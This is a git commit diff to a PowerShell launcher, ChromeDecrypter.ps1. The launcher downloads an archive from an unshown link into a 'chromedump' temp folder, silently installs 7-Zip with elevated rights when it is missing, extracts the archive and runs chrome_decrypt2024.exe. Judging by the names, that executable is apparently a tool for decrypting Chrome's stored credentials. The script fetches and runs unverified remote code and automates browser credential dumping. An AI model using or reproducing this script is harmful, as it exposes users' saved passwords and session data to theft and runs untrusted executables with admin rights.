f5a28bdaa9379983d2ee418e2e3bd6f1e444fdd0
Andreas Mouritsen <77634312+Andreas6920@users.noreply.github.com>
2024-05-28 02:05:50 +0200

    Update ChromeDecrypter.ps1

--- scripts/ChromeDecrypter.ps1
+++ scripts/ChromeDecrypter.ps1
@@ -3,16 +3,21 @@ $File = Join-Path -Path "$Env:TMP\chromedump" -ChildPath "chrome-decrypter-maste
 $Folder = Split-path $file -Parent; if(test-path $folder){rmdir $Folder -Recurse -Force | Out-Null}
 mkdir $Folder
 
-Set-Location $folder
 Write-host "`t- Downloading"
-Invoke-RestMethod -Uri $Link -OutFile $File 
+    Set-Location $folder
+    Invoke-RestMethod -Uri $Link -OutFile $File 
 
 Write-host "`t- Extracting"
-7z e $File -spf
+    if((!(test-path "C:\Program Files (x86)\7-Zip\")) -and (!(test-path "C:\Program Files\7-Zip"))){ 
+        $dlurl = 'https://7-zip.org/' + (Invoke-WebRequest -UseBasicParsing -Uri 'https://7-zip.org/' | Select-Object -ExpandProperty Links | Where-Object {($_.outerHTML -match 'Download')-and ($_.href -like "a/*") -and ($_.href -like "*-x64.exe")} | Select-Object -First 1 | Select-Object -ExpandProperty href)
+        $installerPath = Join-Path $env:TEMP (Split-Path $dlurl -Leaf)
+        Invoke-WebRequest $dlurl -OutFile $installerPath
+        Start-Process -FilePath $installerPath -Args "/S" -Verb RunAs -Wait
+        Remove-Item $installerPath}
+    7z e $File -spf; Start-Sleep -S 5
 
-Start-Sleep -S 5
 Write-host "`t- Running.."
-CLS
-&.\chrome_decrypt2024.exe
+    CLS
+    &.\chrome_decrypt2024.exe
 
 write-host "Credits to: SabinFotograf"
